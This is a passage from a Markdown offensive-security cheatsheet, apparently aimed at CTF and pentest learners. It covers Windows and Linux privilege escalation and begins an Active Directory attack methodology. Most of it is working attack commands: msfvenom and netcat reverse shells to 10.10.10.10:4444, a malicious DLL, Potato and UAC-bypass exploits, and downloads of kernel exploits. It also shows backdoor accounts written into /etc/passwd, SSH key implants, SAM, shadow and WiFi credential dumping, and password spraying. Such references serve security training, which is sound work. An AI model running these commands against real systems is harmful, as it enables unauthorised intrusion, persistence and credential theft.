netstat -an | findstr LISTENING

# ARP table
arp -a

# DNS cache
ipconfig /displaydns
```

### Process & Services

```cmd
# Running processes
tasklist
tasklist /svc
wmic process list full

# Services
sc query
net start
wmic service list brief

# Drivers
driverquery
```

### PowerShell Enumeration

```powershell
# System info
Get-ComputerInfo

# Users
Get-LocalUser
Get-LocalGroupMember Administrators

# Services
Get-Service

# Processes
Get-Process

# Installed software
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

## 🖥 Windows PrivEsc — ⚙️ Service Exploitation

### Find Vulnerable Services

```cmd
# List services
sc query state= all

# Service permissions
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Check specific service
sc qc servicename
```

### Weak Service Permissions

```cmd
# If you can modify service config:
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc config servicename binpath= "net localgroup administrators user /add"
sc stop servicename
sc start servicename
```

### Weak Service Binary Permissions

```cmd
# Check binary permissions
icacls "C:\Program Files\Service\binary.exe"

# If writable, replace with malicious binary
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servicename
sc start servicename
```

### PowerShell Service Check

```powershell
# Get service info
Get-WmiObject win32_service | Select-Object Name, StartName, PathName

# Find modifiable services
Get-ModifiableService
```

---

## 🖥 Windows PrivEsc — 📂 Unquoted Service Paths

### Find Unquoted Paths

```cmd
# Find unquoted service paths
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

### Exploit Unquoted Path

```
# If path is: C:\Program Files\Vulnerable Service\service.exe
# Windows searches:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# Place malicious exe:
copy shell.exe "C:\Program Files\Vulnerable.exe"

# Restart service
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

## 🖥 Windows PrivEsc — 📚 DLL Hijacking

### Find Missing DLLs

```cmd
# Use Process Monitor to find missing DLLs
# Filter: Result = NAME NOT FOUND, Path ends with .dll

# Common locations checked:
# 1. Application directory
# 2. C:\Windows\System32
# 3. C:\Windows
# 4. Current directory
# 5. Directories in PATH
```

### Create Malicious DLL

```c
// msfvenom payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

// Or compile custom DLL:
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

### Exploit

```cmd
# Copy DLL to writable directory in search path
copy evil.dll "C:\Program Files\App\missing.dll"

# Trigger application to load DLL
# Restart service or application
```

---

## 🖥 Windows PrivEsc — 📦 AlwaysInstallElevated

### Check for Vulnerability

```cmd
# Both must be set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploit

```bash
# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Transfer and execute
msiexec /quiet /qn /i evil.msi
```

---

## 🖥 Windows PrivEsc — 🔑 Stored Credentials

### Credential Manager

```cmd
# List stored credentials
cmdkey /list

# Use saved credentials
runas /savecred /user:Administrator cmd.exe
```

### SAM & SYSTEM

```cmd
# Copy SAM files (need SYSTEM)
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# From shadow copies
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

### Registry Credentials

```cmd
# Autologon passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Putty sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Files with Passwords

```cmd
# Search for passwords
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# Unattend files
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# PowerShell history
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# IIS config
type C:\inetpub\wwwroot\web.config
```

### WiFi Passwords

```cmd
# List profiles
netsh wlan show profiles

# Get password
netsh wlan show profile name="SSID" key=clear
```

---

## 🖥 Windows PrivEsc — 🎭 Token Manipulation

### Check Privileges

```cmd
whoami /priv

# Dangerous privileges:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

### SeImpersonatePrivilege

```cmd
# If SeImpersonatePrivilege is enabled:
# Use Potato attacks (JuicyPotato, PrintSpoofer, etc.)

# PrintSpoofer
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### SeBackupPrivilege

```cmd
# Can read any file
# Copy SAM and SYSTEM
robocopy /b C:\Windows\System32\config C:\Users\Public SAM SYSTEM
```

### SeRestorePrivilege

```cmd
# Can write to any location
# Replace system files
```

---

## 🖥 Windows PrivEsc — 🥔 Potato Attacks

### JuicyPotato (Windows Server 2016/2019)

```cmd
# Requires SeImpersonatePrivilege or SeAssignPrimaryToken
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

### PrintSpoofer (Windows 10/Server 2016+)

```cmd
# Requires SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.10.10 4444 -e cmd"
```

### RoguePotato

```cmd
RoguePotato.exe -r 10.10.10.10 -e "cmd /c whoami > C:\Users\Public\out.txt" -l 9999
```

### GodPotato (Windows 10/11/Server 2019-2022)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

---

## 🖥 Windows PrivEsc — 📝 Registry Exploits

### AutoRuns

```cmd
# Check autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# If writable, add malicious entry
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

### Service Registry Keys

```cmd
# Check service registry permissions
accesschk.exe -kvuqws "Everyone" HKLM\System\CurrentControlSet\Services

# Modify service ImagePath
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnerable" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

## 🖥 Windows PrivEsc — ⏰ Scheduled Tasks

### List Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

### Find Writable Task Scripts

```cmd
# If task runs a script you can modify:
icacls "C:\Scripts\backup.bat"

# Add malicious command
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

### Create Malicious Task

```cmd
# If you have permission to create tasks
schtasks /create /tn "Evil" /tr "C:\Users\Public\shell.exe" /sc onlogon /ru SYSTEM
```

---

## 🖥 Windows PrivEsc — 🛡️ UAC Bypass

### Check UAC Level

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

### Fodhelper Bypass

```cmd
# Works on Windows 10
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# Clean up
reg delete HKCU\Software\Classes\ms-settings /f
```

### EventViewer Bypass

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

## 🖥 Windows PrivEsc — 💣 Kernel Exploits

### Check System Info

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Common Exploits

| CVE | Windows Version | Name |
|-----|-----------------|------|
| MS08-067 | XP/2003 | NetAPI |
| MS16-032 | 7/8/10/2012 | Secondary Logon |
| MS17-010 | All | **EternalBlue** |
| CVE-2020-0796 | 10/Server 2019 | **SMBGhost** |
| CVE-2021-1732 | 10/Server | Win32k |
| CVE-2021-34527 | All | **PrintNightmare** |

### PrintNightmare (CVE-2021-34527)

```cmd
# Check if vulnerable
Get-Service Spooler

# Exploit (PowerShell)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "password123!" -DriverName "Xerox"
```

---

## 🖥 Windows PrivEsc — 📊 Quick Reference

### One-Liner Enumeration

```cmd
# Quick info
whoami /all & systeminfo & net user

# Check privileges
whoami /priv

# Services
wmic service get name,pathname | findstr /i /v "c:\windows"

# Scheduled tasks
schtasks /query /fo LIST /v | findstr /i "taskname\|run"
```

### Automated Tools

| Tool | Description |
|------|-------------|
| **WinPEAS** | Comprehensive enumeration |
| **PowerUp** | PowerShell privesc |
| **Seatbelt** | Security checks |
| **SharpUp** | C# privesc checks |

### Quick Wins Checklist

- [ ] `whoami /priv` - Check SeImpersonate
- [ ] Unquoted service paths
- [ ] Writable service binaries
- [ ] AlwaysInstallElevated
- [ ] Stored credentials (cmdkey /list)
- [ ] Autologon passwords in registry
- [ ] Weak service permissions
- [ ] Scheduled task scripts
- [ ] Kernel version - PrintNightmare?

---

## 🖥 Windows PrivEsc — 📚 Resources

- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Related Cheatsheets
- [WinPEAS](../WinPEAS/README.md)
- [Linux PrivEsc](../Linux-PrivEsc/README.md)

---

<p align="center">
  <b>🪟 Get SYSTEM!</b><br>
  <i>Master Windows Privilege Escalation</i>
</p>

## 🐧 Linux PrivEsc — # 🐧 Linux Privilege Escalation - Complete Cheatsheet

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Linux PrivEsc">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Post Exploitation">
  <img src="https://img.shields.io/badge/Root-Access-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Complete guide to escalating privileges on Linux systems</b>
</p>

---

## 🐧 Linux PrivEsc — 📋 Table of Contents

- [Enumeration](#-enumeration)
- [SUID/SGID](#-suidsgid)
- [Capabilities](#-capabilities)
- [Sudo Exploitation](#-sudo-exploitation)
- [Cron Jobs](#-cron-jobs)
- [PATH Hijacking](#-path-hijacking)
- [NFS Root Squashing](#-nfs-root-squashing)
- [Kernel Exploits](#-kernel-exploits)
- [Password Mining](#-password-mining)
- [SSH Keys](#-ssh-keys)
- [Writable Files](#-writable-files)
- [Docker Escape](#-docker-escape)
- [Quick Reference](#-quick-reference)

---

## 🐧 Linux PrivEsc — 🔍 Enumeration

### System Information

```bash
# Hostname
hostname

# OS & Kernel
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# Architecture
arch
uname -m

# CPU info
cat /proc/cpuinfo
lscpu
```

### User Information

```bash
# Current user
whoami
id

# All users
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# User groups
groups
cat /etc/group

# Logged in users
w
who
users

# Last logged in
last
lastlog

# Sudo privileges
sudo -l
```

### Network Information

```bash
# IP addresses
ip a
ifconfig

# Routes
ip route
route -n

# Open ports
netstat -tulpn
ss -tulpn

# Active connections
netstat -an
ss -an

# ARP cache
arp -a
ip neigh

# DNS
cat /etc/resolv.conf

# Hosts
cat /etc/hosts
```

### Process & Services

```bash
# Running processes
ps aux
ps -ef
ps aux | grep root

# Services
systemctl list-units --type=service
service --status-all

# Installed packages
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

### Scheduled Tasks

```bash
# Crontabs
crontab -l
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# Systemd timers
systemctl list-timers
```

---

## 🐧 Linux PrivEsc — 🔐 SUID/SGID

### Find SUID Binaries

```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Find SGID files
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Find both
find / -perm /6000 -type f 2>/dev/null
```

### Common Exploitable SUID Binaries

Check [GTFOBins](https://gtfobins.github.io/) for exploitation methods!

#### **bash**
```bash
# If bash has SUID
./bash -p
```

#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

#### **vim**
```bash
vim -c ':!/bin/sh'
```

#### **nmap** (old versions)
```bash
nmap --interactive
!sh
```

#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

#### **less/more**
```bash
less /etc/passwd
!/bin/sh
```

#### **cp**
```bash
# Copy /etc/passwd, add root user, copy back
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

#### **env**
```bash
env /bin/sh -p
```

---

## 🐧 Linux PrivEsc — ⚡ Capabilities

### Find Capabilities

```bash
# Get file capabilities
getcap -r / 2>/dev/null

# Common dangerous capabilities
# CAP_SETUID - change UID
# CAP_NET_RAW - raw sockets
# CAP_DAC_READ_SEARCH - read any file
```

### Exploit Capabilities

#### **Python (cap_setuid)**
```bash
# If python has cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### **Perl (cap_setuid)**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

#### **tar (cap_dac_read_search)**
```bash
# Read any file
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

#### **vim (cap_setuid)**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## 🐧 Linux PrivEsc — 🔑 Sudo Exploitation

### Check Sudo Permissions

```bash
sudo -l
# Look for NOPASSWD entries
# Look for (ALL) or (root) entries
```

### Exploit Sudo

#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

#### **LD_PRELOAD**
```bash
# If env_keep+=LD_PRELOAD in sudo -l
# Create malicious library

cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_program
```

#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

#### **sudo less/more**
```bash
sudo less /etc/passwd
!/bin/sh
```

#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

#### **sudo nmap** (interactive)
```bash
sudo nmap --interactive
!sh
```

#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

#### **sudo env**
```bash
sudo env /bin/sh
```

#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### **sudo man**
```bash
sudo man man
!/bin/sh
```

#### **sudo apache2**
```bash
sudo apache2 -f /etc/shadow
# Leaks first line of shadow
```

### Sudo Version Exploits

```bash
# Check version
sudo --version

# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

## 🐧 Linux PrivEsc — ⏰ Cron Jobs

### Find Cron Jobs

```bash
# System crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# User crontabs
cat /var/spool/cron/crontabs/*

# Watch for cron
# Use pspy for process monitoring
```

### Exploit Cron Jobs

#### **Writable Cron Script**
```bash
# If cron runs a script you can write to:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# Wait for cron, then:
/tmp/bash -p
```

#### **Wildcard Injection (tar)**
```bash
# If cron runs: tar czf /tmp/backup.tar.gz *

# Create malicious files
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "/path/--checkpoint=1"
touch "/path/--checkpoint-action=exec=sh shell.sh"
```

#### **PATH Exploitation**
```bash
# If cron uses relative path and you control PATH
# Crontab shows: PATH=/home/user:/usr/local/bin:...
# Script calls: backup.sh (without full path)

# Create fake script in writable PATH dir
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/backup.sh
chmod +x /home/user/backup.sh
```

---

## 🐧 Linux PrivEsc — 🛤️ PATH Hijacking

### Find Vulnerable Scripts

```bash
# Look for scripts run by root that use relative paths
# Check SUID scripts
# Check cron scripts
# Check systemd services
```

### Exploit PATH

```bash
# If root script calls 'service' without full path
# and you control PATH:

# Create malicious 'service'
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH

# Run vulnerable script
./vulnerable_script
```

---

## 🐧 Linux PrivEsc — 📁 NFS Root Squashing

### Find NFS Shares

```bash
# On attacker machine
showmount -e target_ip

# Check exports
cat /etc/exports
# Look for no_root_squash
```

### Exploit no_root_squash

```bash
# On attacker (as root):
mkdir /tmp/nfs
mount -o rw target_ip:/share /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# On target:
/share/bash -p
```

---

## 🐧 Linux PrivEsc — 💣 Kernel Exploits

### Check Kernel Version

```bash
uname -r
uname -a
cat /proc/version
```

### Common Kernel Exploits

| CVE | Kernel Version | Name |
|-----|----------------|------|
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | All | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

### Dirty COW (CVE-2016-5195)
```bash
# Download and compile
wget https://www.exploit-db.com/download/40839
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

### PwnKit (CVE-2021-4034)
```bash
# Download
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit
```

### Dirty Pipe (CVE-2022-0847)
```bash
# Check kernel version first
uname -r

# Download and compile
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1
```

---

## 🐧 Linux PrivEsc — 🔑 Password Mining

### Search for Passwords

```bash
# In files
grep -r "password" /home/ 2>/dev/null
grep -r "pass" /etc/ 2>/dev/null
grep -ri "password" /var/www/ 2>/dev/null

# Configuration files
cat /var/www/html/wp-config.php
cat /var/www/html/config.php
cat /etc/mysql/my.cnf

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# Environment
env
printenv
```

### Password Files

```bash
# Shadow file (need root)
cat /etc/shadow

# Password hashes from shadow
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt
```

### Common Locations

```bash
# Web configs
/var/www/html/wp-config.php
/var/www/html/config.php
/var/www/html/.htpasswd

# Database configs
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf

# SSH
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa

# Backup files
find / -name "*.bak" 2>/dev/null
find / -name "*.backup" 2>/dev/null
```

---

## 🐧 Linux PrivEsc — 🔐 SSH Keys

### Find SSH Keys

```bash
# Private keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Authorized keys
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
```

### Exploit SSH Keys

```bash
# If you find a readable private key:
chmod 600 id_rsa
ssh -i id_rsa user@localhost
ssh -i id_rsa root@localhost
```

### Add Your SSH Key

```bash
# Generate key on attacker
ssh-keygen -t rsa -b 4096

# If you can write to authorized_keys:
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
echo "YOUR_PUBLIC_KEY" >> /home/user/.ssh/authorized_keys
```

---

## 🐧 Linux PrivEsc — 📝 Writable Files

### Critical Writable Files

```bash
# Check write permissions
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers
```

### Exploit Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt hacker password
# Result: $1$hacker$TzyKlv0/R/c28R.GAeLw.1

# Add root user
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# Login
su hacker
# Password: password
```

### Find World-Writable Files

```bash
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null

# World-writable directories
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

---

## 🐧 Linux PrivEsc — 🐳 Docker Escape

### Check if in Docker

```bash
# Check for .dockerenv
ls -la /.dockerenv

# Check cgroups
cat /proc/1/cgroup | grep docker

# Check hostname (random string)
hostname
```

### Docker Socket Mount

```bash
# If docker.sock is mounted
find / -name docker.sock 2>/dev/null
ls -la /var/run/docker.sock

# Escape using docker socket
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Privileged Container

```bash
# If container is privileged
fdisk -l                    # See host disks
mount /dev/sda1 /mnt
chroot /mnt
```

---

## 🐧 Linux PrivEsc — 📊 Quick Reference

### One-Liner Enumeration

```bash
# Quick system info
id; hostname; uname -a; cat /etc/issue

# Quick SUID
find / -perm -4000 -type f 2>/dev/null

# Quick capabilities
getcap -r / 2>/dev/null

# Quick sudo
sudo -l

# Quick cron
cat /etc/crontab; ls -la /etc/cron*

# Quick passwords
grep -r "password" /home/ 2>/dev/null
```

### Automated Tools

| Tool | Description |
|------|-------------|
| **LinPEAS** | Comprehensive enumeration |
| **LinEnum** | Linux enumeration |
| **linux-smart-enumeration** | LSE |
| **pspy** | Process monitor |

### Quick Wins Checklist

- [ ] `sudo -l` - Check sudo permissions
- [ ] SUID binaries - Find and check GTFOBins
- [ ] Capabilities - `getcap -r / 2>/dev/null`
- [ ] Cron jobs - Writable scripts?
- [ ] Kernel version - Known exploits?
- [ ] Readable /etc/shadow
- [ ] Writable /etc/passwd
- [ ] SSH keys in /home/* or /root
- [ ] Docker socket mounted
- [ ] NFS with no_root_squash

---

## 🐧 Linux PrivEsc — 📚 Resources

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

### Related Cheatsheets
- [LinPEAS](../LinPEAS/README.md)
- [Windows PrivEsc](../Windows-PrivEsc/README.md)

---

<p align="center">
  <b>🐧 Get Root!</b><br>
  <i>Master Linux Privilege Escalation</i>
</p>

## 🏢 Active Directory — # 🏢 Active Directory Attack Methodology

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Step-by-Step Guide from User to Domain Admin
```

<p align="center">
  <img src="https://img.shields.io/badge/AD-Methodology-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Guide-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

## 🏢 Active Directory — 📋 Table of Contents

1. [Phase 1: Enumeration](#-phase-1-enumeration)
2. [Phase 2: Initial Access](#-phase-2-initial-access)
3. [Phase 3: Privilege Escalation](#-phase-3-privilege-escalation)
4. [Phase 4: Lateral Movement](#-phase-4-lateral-movement)
5. [Phase 5: Persistence](#-phase-5-persistence)
6. [Phase 6: Domain Dominance](#-phase-6-domain-dominance)
7. [Quick Command Reference](#-quick-command-reference)

---

## 🏢 Active Directory — 🔍 Phase 1: Enumeration

### 1.1 Network Discovery

```bash
# Find domain controllers
nmap -p 53,88,389,636,445 10.10.10.0/24

# Identify AD services
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**Key Ports:**
| Port | Service | Purpose |
|------|---------|---------|
| 53 | DNS | Domain resolution |
| 88 | Kerberos | Authentication |
| 389 | LDAP | Directory |
| 445 | SMB | File shares |
| 636 | LDAPS | Secure LDAP |
| 5985 | WinRM | Remote mgmt |

### 1.2 Anonymous Enumeration (No Creds)

```bash
# RPC null session
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# LDAP anonymous bind
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux
enum4linux -a 10.10.10.10

# Kerbrute user enum (no creds!)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

### 1.3 With Valid Credentials

```bash
# Get domain info
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# LDAP enumeration
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

### 1.4 PowerView Enumeration

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController

# Find interesting targets
Get-DomainUser -SPN                    # Kerberoastable
Get-DomainUser -PreauthNotRequired      # AS-REP roastable
Get-DomainComputer -Unconstrained       # Delegation

# Find DA sessions
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### 1.5 BloodHound Collection

```bash
# From Linux (bloodhound-python)
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# From Windows (SharpHound)
.\SharpHound.exe -c All
```

**BloodHound Queries:**
```cypher
# Shortest path to DA
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u.name

# Users with DCSync rights
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

---

## 🏢 Active Directory — 🔑 Phase 2: Initial Access

### 2.1 Password Spraying

```bash
# CrackMapExec spray
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Kerbrute spray
